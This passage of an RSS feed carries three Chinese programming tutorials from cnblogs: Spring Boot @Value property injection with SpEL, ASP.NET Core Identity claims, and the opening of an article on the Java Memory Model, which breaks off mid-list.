<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>结合SpEL使用@Value-基于配置文件或非配置的文件的值注入-Spring Boot  - 字母哥博客</title>
<link>http://www.cnblogs.com/zimug/p/13270603.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zimug/p/13270603.html</guid>
<description>&lt;p&gt;本文主要介绍Spring @Value 注解注入属性值的使用方法的分析，文章通过示例代码非常详细地介绍，对于每个人的学习或工作都有一定的参考学习价值&lt;/p&gt;
&lt;p&gt;在使用spring框架的项目中，@Value是经常使用的注解之一。其功能是将与配置文件中的键对应的值分配给其带注解的属性。在日常使用中，我们常用的功能相对简单。本文使您系统地了解@Value的用法。&lt;/p&gt;
&lt;h2 id=&quot;value注入形式&quot;&gt;@Value注入形式&lt;/h2&gt;
&lt;p&gt;根据注入的内容来源，@ Value属性注入功能可以分为两种：通过配置文件进行属性注入和通过非配置文件进行属性注入。&lt;/p&gt;
&lt;p&gt;非配置文件注入的类型如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;注入普通字符串&lt;/li&gt;
&lt;li&gt;注入操作系统属性&lt;/li&gt;
&lt;li&gt;注射表达结果&lt;/li&gt;
&lt;li&gt;注入其他bean属性&lt;/li&gt;
&lt;li&gt;注入文件资源&lt;/li&gt;
&lt;li&gt;注入URL资源&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;基于配置文件的注入&quot;&gt;基于配置文件的注入&lt;/h2&gt;
&lt;p&gt;首先，让我们看一下配置文件中的数据注入，无论它是默认加载的application.properties还是自定义my.properties文档（需要@PropertySource额外加载）。例如：application.properties属性值以以下形式定义：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;user.name=admin
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;my.properties配置文件中定义的属性如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;user.password=pwd123
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后，在bean中使用@Value，如下所示：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@PropertySource(&quot;classpath:my.properties&quot;)
@RestController
public class ValueController {

  /**
   *Get in application.properties Properties configured in
   */
  @Value(&quot;${user.name}&quot;)
  private String name;

  /**
   *Get in my.properties Configuration properties in
   */
  @Value(&quot;${user.password}&quot;)
  private String password;

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;区别在于，在spring boot项目中，如果使用my.properties文件，则需要通过类中的@ PropertySource导入配置文件，而application.properties中的属性将自动加载。&lt;/p&gt;
&lt;p&gt;同时，您不仅可以通过@Value注入单个属性，还可以采用数组和列表的形式。例如，配置如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;tools=car,train,airplane
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以通过以下方式注入它：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/**
 *Injection array (automatically split according to &quot;,&quot;)
 */
@Value(&quot;${tools}&quot;)
private String[] toolArray;

/**
 *Injection list form (automatic segmentation based on &quot;,&quot; and)
 */
@Value(&quot;${tools}&quot;)
private List&amp;lt;String&amp;gt; toolList;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认情况下，spring将以“，”分割，并将其转换为相应的数组或列表。&lt;/p&gt;
&lt;h2 id=&quot;基于非配置文件的注入&quot;&gt;基于非配置文件的注入&lt;/h2&gt;
&lt;p&gt;在使用示例说明基于非配置文件注入属性的实例之前，让我们看一下SpEl。&lt;/p&gt;
&lt;p&gt;Spring Expression Language是Spring表达式语言，可以在运行时查询和操作数据。使用＃{…}作为操作符号，大括号中的所有字符均视为SpEl。&lt;/p&gt;
&lt;p&gt;让我们看一下特定实例场景的应用：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/**
 *实例化一个字符串，并赋予默认值
 */
@Value
private String wechatSubscription;

/**
 *读取系统的环境变量
 */
@Value(&quot;#{systemProperties['os.name']}&quot;)
private String systemPropertiesName;

/**
 *注入表达式计算结果
 */
@Value(&quot;#{ T(java.lang.Math).random() * 100.0 }&quot;)
private double randomNumber;

/**
 *读取一个bean:config的tool属性并注入
 */
@Value(&quot;#{config.tool}&quot;)
private String tool;

/**
 *将words用“|”分隔为字符串数组
 */
@Value(&quot;#{'${words}'.split('\|')}&quot;)
private List&amp;lt;String&amp;gt; numList;

/**
 *注入一个文件资源
 */
@Value(&quot;classpath:config.xml&quot;)
private Resource resourceFile;

/**
 *注入 URL 资源
 */
@Value(&quot;http://www.choupangxia.com&quot;)
private URL homePage;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的示例显示了以下方案的使用：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;直接注入字符串等效于实例化时直接初始化字符串。初始化空串&lt;/li&gt;
&lt;li&gt;通过＃{}注入系统变量。&lt;/li&gt;
&lt;li&gt;表达式计算结果通过＃{}注入。&lt;/li&gt;
&lt;li&gt;通过＃{}注入其他bean的属性。&lt;/li&gt;
&lt;li&gt;通过{}和$ {}的组合注入属性，然后拆分。&lt;/li&gt;
&lt;li&gt;注入文件资源，并将相应的字符串值转换为相应的资源文件。&lt;/li&gt;
&lt;li&gt;注入URL资源并将相应的URL字符串转换为URL。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;默认值注入&quot;&gt;默认值注入&lt;/h2&gt;
&lt;p&gt;无论使用#{}(SpEL)还是$ {}进行属性注入，当无法获得相应的值时，都需要设置默认值，可以通过以下方式进行设置。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/**
 *If IP is not configured in the property, the default value is used
 */
@Value(&quot;${ip:127.0.0.1}&quot;)
private String ip;

/**
 *If the value of port is not obtained in the system properties, 8888 is used.
 */
@Value(&quot;#{systemProperties['port']?:'8888'}&quot;)
private String port;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;$ {}中直接使用“：”来设置未定义或空值的默认值，而＃{}则需要使用“？：”来设置未设置属性的默认值。&lt;/p&gt;
&lt;h2 id=&quot;欢迎关注我的博客，里面有很多精品合集&quot;&gt;欢迎关注我的博客，里面有很多精品合集&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;本文转载注明出处（必须带连接，不能只转文字）：&lt;a href=&quot;http://www.zimug.com&quot;&gt;字母哥博客&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;觉得对您有帮助的话，帮我点赞、分享！您的支持是我不竭的创作动力！&lt;/strong&gt; 。另外，笔者最近一段时间输出了如下的精品内容，期待您的关注。&lt;/p&gt;
</description>
<pubDate>Thu, 09 Jul 2020 00:25:00 +0000</pubDate>
<dc:creator>字母哥博客</dc:creator>
<og:description>本文主要介绍Spring @Value 注解注入属性值的使用方法的分析，文章通过示例代码非常详细地介绍，对于每个人的学习或工作都有一定的参考学习价值 在使用spring框架的项目中，@Value是经常</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zimug/p/13270603.html</dc:identifier>
</item>
<item>
<title>【asp.net core 系列】15 自定义Identity - 月影西下</title>
<link>http://www.cnblogs.com/c7jie/p/13270513.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/c7jie/p/13270513.html</guid>
<description>&lt;p&gt;在之前的文章中简单介绍了一下asp.net core中的Identity，这篇文章将继续针对Identity进行进一步的展开。&lt;/p&gt;

&lt;p&gt;在《【asp.net core 系列】13 Identity 身份验证入门》一文中，我们大概了解了如何使用Identity，以及如何保存一些信息以便后续的验证。这里我们将深入讨论一下如何给Identity添加更多的信息。&lt;/p&gt;
&lt;p&gt;我们知道在给Identity添加数据的时候，需要添加一个Claim对象。我们先回顾一下Claim的信息，Claim的属性大多只提供了公开的get访问器，所以这个类的重点在于构造方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public class Claim
{
    // 基础的
    public Claim(string type, string value);
    public Claim(string type, string value, string valueType);
    public Claim(string type, string value, string valueType, string issuer);
    public Claim(string type, string value, string valueType, string issuer, string originalIssuer);
    //
    public Claim(BinaryReader reader);
    public Claim(BinaryReader reader, ClaimsIdentity subject);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;暂且看一下几个使用字符类型的构造函数参数：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;type Claim的类型，支持自定义，但asp.net core 提供了一个基础的类型定义：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public static class ClaimTypes
{
    // 隐藏其他属性
    public const string Name = &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name&quot;;
    public const string Role = &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ 这个类里定义了大多数情况下会用到的Claims的类型。&lt;/p&gt;
&lt;ol start=&quot;2&quot; readability=&quot;4&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;value 存放Claim的值，通常情况下不对这个值进行约束&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;valueType 表示 value的类型，取值范围参考类：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public static class ClaimValueTypes
{
    public const string Base64Binary = &quot;http://www.w3.org/2001/XMLSchema#base64Binary&quot;;
    public const string UpnName = &quot;http://schemas.xmlsoap.org/claims/UPN&quot;;
    public const string UpnName = &quot;http://schemas.xmlsoap.org/claims/UPN&quot;;
        public const string UInteger32 = &quot;http://www.w3.org/2001/XMLSchema#uinteger32&quot;;
    public const string Time = &quot;http://www.w3.org/2001/XMLSchema#time&quot;;
    public const string String = &quot;http://www.w3.org/2001/XMLSchema#string&quot;;
    public const string Sid = &quot;http://www.w3.org/2001/XMLSchema#sid&quot;;
    public const string RsaKeyValue = &quot;http://www.w3.org/2000/09/xmldsig#RSAKeyValue&quot;;
    public const string Rsa = &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/rsa&quot;;
    public const string Rfc822Name = &quot;urn:oasis:names:tc:xacml:1.0:data-type:rfc822Name&quot;;
    public const string KeyInfo = &quot;http://www.w3.org/2000/09/xmldsig#KeyInfo&quot;;
    public const string Integer64 = &quot;http://www.w3.org/2001/XMLSchema#integer64&quot;;
    public const string X500Name = &quot;urn:oasis:names:tc:xacml:1.0:data-type:x500Name&quot;;
    public const string Integer32 = &quot;http://www.w3.org/2001/XMLSchema#integer32&quot;;
    public const string HexBinary = &quot;http://www.w3.org/2001/XMLSchema#hexBinary&quot;;
    public const string Fqbn = &quot;http://www.w3.org/2001/XMLSchema#fqbn&quot;;
    public const string Email = &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;;
    public const string DsaKeyValue = &quot;http://www.w3.org/2000/09/xmldsig#DSAKeyValue&quot;;
    public const string Double = &quot;http://www.w3.org/2001/XMLSchema#double&quot;;
    public const string DnsName = &quot;http://schemas.xmlsoap.org/claims/dns&quot;;
    public const string DaytimeDuration = &quot;http://www.w3.org/TR/2002/WD-xquery-operators-20020816#dayTimeDuration&quot;;
    public const string DateTime = &quot;http://www.w3.org/2001/XMLSchema#dateTime&quot;;
    public const string Date = &quot;http://www.w3.org/2001/XMLSchema#date&quot;;
    public const string Boolean = &quot;http://www.w3.org/2001/XMLSchema#boolean&quot;;
    public const string Base64Octet = &quot;http://www.w3.org/2001/XMLSchema#base64Octet&quot;;
    public const string Integer = &quot;http://www.w3.org/2001/XMLSchema#integer&quot;;
    public const string YearMonthDuration = &quot;http://www.w3.org/TR/2002/WD-xquery-operators-20020816#yearMonthDuration&quot;;
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;issuer 用来存放 Claim的发布者，默认值是：&lt;code&gt;ClaimsIdentity.DefaultIssuer&lt;/code&gt; 该值允许在构造函数是传NULL，一旦传NULL，则自动认为是&lt;code&gt;ClaimsIdentity.DefaultIssuer&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;originalIssuer Claim的原发布人，如果不给值，则默认与issuer一致。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这是从构造函数以及相关文档中获取到的。&lt;/p&gt;
&lt;p&gt;关于ClaimTypes里我只贴了两个，原因是这两个值在Claim中是两个必不可少的值。根据属性名就能看出来，一个是设置用户的名称，一个是设置用户的角色。&lt;/p&gt;
&lt;p&gt;那么，继续探索Claim里的属性和方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public class Claim
{
    public string Type { get; }
    public ClaimsIdentity Subject { get; }
    public IDictionary&amp;lt;string, string&amp;gt; Properties { get; }
    public string OriginalIssuer { get; }
    public string Issuer { get; }
    public string ValueType { get; }
    public string Value { get; }
    public virtual Claim Clone();
    public virtual Claim Clone(ClaimsIdentity identity);
    public virtual void WriteTo(BinaryWriter writer);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;几个基本属性都是从构造函数中获取的，这里就不做过多的介绍了。不过值得注意的一点是，Properties这个属性的值获取是需要使用&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public Claim(BinaryReader reader, ClaimsIdentity? subject)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个构造方法才可以有效的对其进行赋值，所以这个属性并没有太多值得关注的地方。&lt;/p&gt;
&lt;p&gt;介绍完了Claim类之后，我们继续看一下Identity相关的常用类：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public class ClaimsIdentity : IIdentity;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过这个类的声明，我们可以看出它实现了接口：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public interface IIdentity
{
    string? AuthenticationType { get; }
    bool IsAuthenticated { get; }
    string? Name { get; }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;AuthenticationType 表示验证类型&lt;/li&gt;
&lt;li&gt;IsAuthenticated 表示是否验证通过&lt;/li&gt;
&lt;li&gt;Name 存放的用户名&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这是Identity里最关键的三个属性，贯穿着整个Identity体系。我们继续看一下ClaimsIdentity的几个关键点：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public class ClaimsIdentity : IIdentity
{
    public ClaimsIdentity(string authenticationType);
    public ClaimsIdentity(IIdentity identity);
    public ClaimsIdentity(IEnumerable&amp;lt;Claim&amp;gt; claims);
    public ClaimsIdentity(IEnumerable&amp;lt;Claim&amp;gt; claims, string authenticationType);
    public ClaimsIdentity(IIdentity identity, IEnumerable&amp;lt;Claim&amp;gt; claims);
    public virtual void AddClaim(Claim claim);
    public virtual void AddClaims(IEnumerable&amp;lt;Claim&amp;gt; claims);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于ClaimsIdentity而言，其核心内容是Claim实例。我们通常需要构造Claim对象，在Claim对象中添加我们想添加的值，然后装入ClaimIdentity中。这里有一个值需要额外注意一下：AuthenticationType 表示验证类型，值并没有额外要求，不过对于使用Cookie作为信息保存的话，需要设置值为：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;CookieAuthenticationDefaults.AuthenticationScheme
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这时候，我们已经获得了一个Identity对象，在asp.net core 中 Identity体系还有最后一个关键类：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public class ClaimsPrincipal : IPrincipal
{
    public ClaimsPrincipal();
    public ClaimsPrincipal(IIdentity identity);
    public ClaimsPrincipal(IPrincipal principal);
    public virtual void AddIdentities(IEnumerable&amp;lt;ClaimsIdentity&amp;gt; identities);
    public virtual void AddIdentity(ClaimsIdentity identity);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个类提供了几个方法用来存储Identity，这个类在IPrincipal基础上以Identity为基础数据。这一点可以通过构造函数和它提供的一些方法可以确认。&lt;/p&gt;

&lt;p&gt;在第一小节中，我简单介绍了一下如何利用Claim和ClaimsIdentity以及ClaimsPrincipal这三个类来存储用户信息以及我们想要的数据。这里我们看一下如何通过Principal读取信息，以及简单剖析一下背后的逻辑。&lt;/p&gt;
&lt;p&gt;我们使用HttpContext的扩展方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public static Task SignInAsync(this HttpContext context, ClaimsPrincipal principal);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将我们设置的principal数据保存，所保存的地方取决于我们在Startup.cs中的设置。在该系列中，我们启用了Cookie，所以这个信息会以Cookie的形式保存。&lt;/p&gt;
&lt;p&gt;在控制器内部时，Controller类为我们提供了一个属性：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public ClaimsPrincipal User { get; }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过这个属性可以反向获取到我们保存的Principal实例。&lt;/p&gt;
&lt;p&gt;接下来，让我们反向解析出Principal里面的数据：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public interface IPrincipal
{
    IIdentity? Identity { get; }
    bool IsInRole(string role);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;IPrincipal提供了两个基础数据和方法，一个是获取一个Identity对象，一个是判断是否是某个角色。&lt;/p&gt;
&lt;h2 id=&quot;21-identity&quot;&gt;2.1 Identity&lt;/h2&gt;
&lt;p&gt;在ClaimPrincipal中，Identity属性的默认取值逻辑是：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;if (identities == null)
{
    throw new ArgumentNullException(nameof(identities));
}

foreach (ClaimsIdentity identity in identities)
{
    if (identity != null)
    {
        return identity;
    }
}

return null;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是获取Principal中第一个不为Null的Identity对象，这个取值逻辑可以通过下面的属性进行修改：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public static Func&amp;lt;IEnumerable&amp;lt;ClaimsIdentity&amp;gt;, ClaimsIdentity?&amp;gt; PrimaryIdentitySelector { get; set; }
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;22-isinrole&quot;&gt;2.2 IsInRole&lt;/h2&gt;
&lt;p&gt;在Principal中，通常会存放一至多个Identity对象，每个 Identity对象有一至多个Claim对象。当有Claim对象的Type 值与Identity对象的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public string RoleClaimType { get; }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;值一致时，就会被认为该Claim里面存放着角色信息，这时候会通过传入的role值与Claim的Value进行比较。&lt;/p&gt;
&lt;p&gt;比较的方法是Identity的实例方法HasClaim：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual bool HasClaim(string type, string value);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果初始化Identity时，没有手动设置roleType参数，那么这个参数取值就是：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public const string DefaultRoleClaimType = ClaimTypes.Role;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通常情况下，不会单独设置roleType。&lt;/p&gt;
&lt;h2 id=&quot;23-isauthenticated-判断是否登录&quot;&gt;2.3 IsAuthenticated 判断是否登录&lt;/h2&gt;
&lt;p&gt;这个属性并不是ClaimPrincipal的，而是ClaimIdentity的。通常在asp.net core 中会使用这个属性判断访问者是否完成了身份校验。这个属性的判断逻辑也很简单：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual bool IsAuthenticated
{
    get { return !string.IsNullOrEmpty(AuthenticationType); }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是说，在Identity中指定了AuthenticationType就会认为完成了身份校验。&lt;/p&gt;
&lt;p&gt;通常的使用方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;User.Identity.IsAuthenticated
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过以上调用链进行数据调用。&lt;/p&gt;
&lt;h2 id=&quot;24-name&quot;&gt;2.4 Name&lt;/h2&gt;
&lt;p&gt;与IsAuthenticatedy一样，这个属性也是ClaimIdentity的。与IsInRole的判断依据类似，这个属性会获取Identity中存放的Claim集合中第一个RoleType为ClaimType.Name的Claim，然后取值。&lt;/p&gt;
&lt;p&gt;所以，在实现登录的时候，如果想要能够通过：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;User.Identity.Name
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;获取一个用户名信息或者其他名称信息的话，则需要设置一个Type等于：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public const string DefaultNameClaimType = ClaimTypes.Name;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;的Claim实例对象。&lt;/p&gt;
&lt;h2 id=&quot;25-获取claim&quot;&gt;2.5 获取Claim&lt;/h2&gt;
&lt;p&gt;在Principal体系中，最重要也是最基础的数据就是Claim对象。对于ClaimPrincipal对象来说，里面必然会存放多个Claim对象。那么，我们就需要有操作Claim对象的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual IEnumerable&amp;lt;Claim&amp;gt; Claims { get; }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过这个方法可以获得ClaimPrincipal里所有的Claim对象，这是一个迭代器对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual IEnumerable&amp;lt;Claim&amp;gt; FindAll(Predicate&amp;lt;Claim&amp;gt; match);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过一个选择器筛选出符合条件的Claim集合。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual IEnumerable&amp;lt;Claim&amp;gt; FindAll(string type);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查询所有符合类型的Claim对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual Claim FindFirst(string type);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查找第一个Type值与指定值相同的Claim对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual bool HasClaim(Predicate&amp;lt;Claim&amp;gt; match);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查询是否存在符合条件的Claim对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c#&quot;&gt;public virtual bool HasClaim(string type, string value);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查询是否有Type和Value属性均等于指定值的Claim对象。&lt;/p&gt;
&lt;p&gt;这些方法都是ClaimPrincipal里的，相对应的ClaimIdentity里也提供了类似的方法这里就不做介绍了。&lt;/p&gt;

&lt;p&gt;这一章介绍了如何利用Claim进行用户信息保存，以及常规的一些使用逻辑。下一章，我们将继续探索如何利用我们自己设置的Identity以达到我们的目的。&lt;/p&gt;
&lt;blockquote readability=&quot;2.1052631578947&quot;&gt;
&lt;p&gt;更多内容烦请关注&lt;a href=&quot;https://www.attachie.club&quot;&gt;我的博客《高先生小屋》&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1266612/202007/1266612-20200709082213001-723944430.png&quot; alt=&quot;file&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Jul 2020 00:22:00 +0000</pubDate>
<dc:creator>月影西下</dc:creator>
<og:description>0. 前言 在之前的文章中简单介绍了一下asp.net core中的Identity，这篇文章将继续针对Identity进行进一步的展开。 1. 给Identity添加额外的信息 在《【asp.net</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/c7jie/p/13270513.html</dc:identifier>
</item>
<item>
<title>深入理解JVM（③）学习Java的内存模型 - 纪莫</title>
<link>http://www.cnblogs.com/jimoer/p/13270409.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jimoer/p/13270409.html</guid>
<description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
&lt;p&gt;Java内存模型（Java Memory Model）用来屏蔽各种硬件和操作系统的内存访问差异，这使得Java能够变得非常灵活而不用考虑各系统间的兼容性等问题。定义Java内存模型并非一件容易的事情，从Java出生开始经过长时间的验证和修补，直至JDK5发布后Java内存模型才终于成熟、完善起来了。&lt;/p&gt;
&lt;h3 id=&quot;主内存与工作内存&quot;&gt;主内存与工作内存&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Java内存模型的主要目的是定义程序中各种变量的访问规则，即关注在虚拟机中把变量值存储到内存和从内存中取出变量值这样的底层细节&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;Java内存模型规定了所有变量都存储在主内存（Main Memory）中（此处的内存为Java虚拟机内存的一部分）。每条线程还有自己的工作内存（Working Memory）,线程的工作内存中保存了被该线程使用的变量内存副本，线程对变量的所有操作都必须在工作内存中进行，也不能直接读写主内存中数据。不同的线程之间变量值的传递均需要通过主内存来完成。&lt;/p&gt;
&lt;p&gt;线程、主内存、工作内存三者的交互关系如下图。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200706215623247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_60,color_c8cae6,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;内存间交互操作&quot;&gt;内存间交互操作&lt;/h3&gt;
&lt;p&gt;对于主内存和工作内存之间具体的交互协议，Java内存模型中定义了以下8中操作拉完成。&lt;br/&gt;&lt;strong&gt;&lt;code&gt;Java虚拟机实现时必须保证下面提及的每一种操作都是原子的、不可再分的&lt;/code&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;mark&gt;&lt;strong&gt;lock(锁定)&lt;/strong&gt;&lt;/mark&gt;：作用于主内存的变量，它把一个变量标识为一条线程独占的状态。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;unlock(解锁)&lt;/strong&gt;&lt;/mark&gt;：作用于主内存的变量，它把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;read(读取)&lt;/strong&gt;&lt;/mark&gt;：作用于主内存的变量，它把一个变量的值从主内存传输到线程的工作内存中，以便最后的load动作使用。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;load(载入)&lt;/strong&gt;&lt;/mark&gt;：作用于工作内存变量，它把read操作从主内存中得到的变量值放入工作内存的变量副本中。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;use（使用）&lt;/strong&gt;&lt;/mark&gt;：作用于工作内存的变量，它把工作内存中一个变量的值传递给执行引擎，每当遇到一个需要使用变量的值的字节码指令时将会执行这个操作。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;assign(赋值)&lt;/strong&gt;&lt;/mark&gt;：作用于工作内存的变量，它把一个从执行引擎接收的值赋给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;store（存储）&lt;/strong&gt;&lt;/mark&gt;：作用于工作内存的变量，它工作内存中一个变量的值传送到主内存中，以便随后的write操作使用。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;write（写入）&lt;/strong&gt;&lt;/mark&gt;：作用于主内存的变量，它把store操作从工作内存中得到的变量的值放入主内存的变量中。&lt;/li&gt;
